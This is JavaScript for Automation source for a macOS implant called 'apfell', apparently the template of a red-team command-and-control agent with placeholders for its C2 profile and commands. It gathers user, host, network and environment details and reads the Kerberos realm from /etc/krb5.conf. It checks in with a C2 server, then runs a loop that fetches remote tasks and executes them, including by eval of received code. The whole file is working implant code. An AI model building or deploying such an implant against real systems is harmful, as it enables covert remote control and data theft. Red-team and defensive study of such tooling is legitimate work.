// Created by Cody Thomas - @its_a_feature_
ObjC.import('Cocoa');
ObjC.import('Foundation'); //there by default I think, but safe to include anyway
ObjC.import('stdlib');
ObjC.bindFunction('CFMakeCollectable', ['id', ['void *'] ]);
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;
//--------------IMPLANT INFORMATION-----------------------------------
class agent{
	constructor(){
		this.procInfo = $.NSProcessInfo.processInfo;
		this.hostInfo = $.NSHost.currentHost;
		this.id = "";
		this.user = ObjC.deepUnwrap(this.procInfo.userName);
		this.fullName = ObjC.deepUnwrap(this.procInfo.fullUserName);
		//every element in the array needs to be unwrapped
		this.ip = ObjC.deepUnwrap(this.hostInfo.addresses); //probably just need [0]
		this.pid = this.procInfo.processIdentifier;
		//every element in the array needs to be unwrapped
		this.host = ObjC.deepUnwrap(this.hostInfo.names); //probably just need [0]
		//this is a dictionary, but every 'value' needs to be unwrapped
		this.environment = ObjC.deepUnwrap(this.procInfo.environment);
		this.uptime = this.procInfo.systemUptime;
		//every element in the array needs to be unwrapped
		this.args = ObjC.deepUnwrap(this.procInfo.arguments);
		this.osVersion = this.procInfo.operatingSystemVersionString.js;
		this.uuid = "UUID_HERE";
	}
}
var apfell = new agent();
//--------------Base C2 INFORMATION----------------------------------------
class baseC2{
	//To create your own C2, extend this class and implement the required functions
	//The main code depends on the mechanism being C2 with these functions.
	//   the implementation of the functions doesn't matter though
	//   You're welcome to add additional functions as well, but this is the minimum
	constructor(interval, baseurl){
		this.interval = interval; //seconds between callbacks
		this.baseurl = baseurl; //where to reach out to
		this.commands = [];
	}
	checkin(){
		//check in with c2 server
	}
	getTasking(){
		//reach out to wherever to get tasking
	}
	getConfig(){
		//gets the current configuration for tasking
	}
	postResponse(task, output){
		//output a response to a task
	}
	setConfig(params){
		//updates the current configuration for how to get tasking
	}
	download(task, params){
	    //gets a file from the apfell server in some way
	}
	upload(task, params){
	    //uploads a file in some way to the teamserver
	}
}
C2PROFILE_HERE
//-------------SHARED COMMAND CODE ------------------------
does_file_exist = function(strPath){
    var error = $();
    return $.NSFileManager.defaultManager.attributesOfItemAtPathError($(strPath).stringByStandardizingPath, error), error.code === undefined;
};
convert_to_nsdata = function(strData){
    // helper function to convert UTF8 strings to NSData objects
    var tmpString = $.NSString.alloc.initWithCStringEncoding(strData, $.NSData.NSUnicodeStringEncoding);
    return tmpString.dataUsingEncoding($.NSData.NSUTF16StringEncoding);
};
write_data_to_file = function(data, file_path){
    try{
        //var open_file = currentApp.openForAccess(Path(file_path), {writePermission: true});
        //currentApp.setEof(open_file, { to: 0 }); //clear the current file
        //currentApp.write(data, { to: open_file, startingAt: currentApp.getEof(open_file) });
        //currentApp.closeAccess(open_file);
        if(typeof data == "string"){
            data = convert_to_nsdata(data);
        }
        if (data.writeToFileAtomically($(file_path), true)){
            return "file written";
        }
        else{
            return "failed to write file";
        }
     }
     catch(error){
        return "failed to write to file: " + error.toString();
     }
};
default_load = function(contents){
    var module = {exports: {}};
    var exports = module.exports;
    if(typeof contents == "string"){
        eval(contents);
    }
    else{
        eval(contents.js);
    }
    return module.exports;
};
base64_decode = function(data){
    if(typeof data == "string"){
        var ns_data = $.NSData.alloc.initWithBase64Encoding($(data));
    }
    else{
        var ns_data = data;
    }
    var decoded_data = $.NSString.alloc.initWithDataEncoding(ns_data, $.NSUTF8StringEncoding).js;
    return decoded_data;
};
base64_encode = function(data){
    if(typeof data == "string"){
        var ns_data = convert_to_nsdata(data);
    }
    else{
        var ns_data = data;
    }
    var encoded = ns_data.base64EncodedStringWithOptions(0).js;
    return encoded;
};
var exports = {};  // get stuff ready for initial command listing
COMMANDS_HERE
//console.log("about to load commands");
var commands_dict = exports;
var jsimports = "";

//-------------GET IP AND CHECKIN ----------------------------------
if( $.NSDate.date.compare(C2.kill_date) === $.NSOrderedDescending ){
  $.NSApplication.sharedApplication.terminate(this);
}
let ip_found = false;
C2.commands =  Object.keys(commands_dict);
let domain = "";
if(does_file_exist("/etc/krb5.conf")){
    let contents = $.NSString.stringWithContentsOfFileEncodingError("/etc/krb5.conf", $.NSUTF8StringEncoding, $.nil).js;
    contents = contents.split("\n");
    for(let j = 0; j < contents.length; j++){
        if(contents[j].includes("default_realm")){
            domain = contents[j].split("=")[1].trim();
        }
    }
}
for(let i=0; i < apfell.ip.length; i++){
	let ip = apfell.ip[i];
	if (ip.includes(".") && ip !== "127.0.0.1"){ // the includes(".") is to make sure we're looking at IPv4
		C2.checkin(ip,apfell.pid,apfell.user,ObjC.unwrap(apfell.procInfo.hostName),apfell.osVersion, "x64", domain);
		ip_found = true;
		break;
	}
}
if(!ip_found){
    C2.checkin("127.0.0.1",apfell.pid,apfell.user,ObjC.unwrap(apfell.procInfo.hostName),apfell.osVersion, "x64", domain);
}
//---------------------------MAIN LOOP ----------------------------------------
function sleepWakeUp(){
    while(true){
        $.NSThread.sleepForTimeInterval(C2.gen_sleep_time());
        let output = "";
        let task = C2.getTasking();
        //console.log(JSON.stringify(task));
        let command = "";
        try{
        	//console.log(JSON.stringify(task));
        	if(task.length === 0){
        		continue;
        	}
        	task = task[0];
        	//console.log(JSON.stringify(task));
            command = task["command"];
            try{
                output = commands_dict[command](task, command, task['parameters']);
            }
            catch(error){
                if(error.toString().includes("commands_dict[command] is not a function")){
                    output ={"user_output": "Unknown command: " + command, "status": "error", "completed": true};
                }
                else{
                    output = {"user_output": error.toString(), "status": "error", "completed": true};
                }
            }
            C2.postResponse(task, output);
        }
        catch(error){
            C2.postResponse(task, {"user_output": error.toString(), "status": "error", "completed": true});
        }
        //task["command"] = "none"; //reset just in case something goes weird
    }
}
sleepWakeUp();
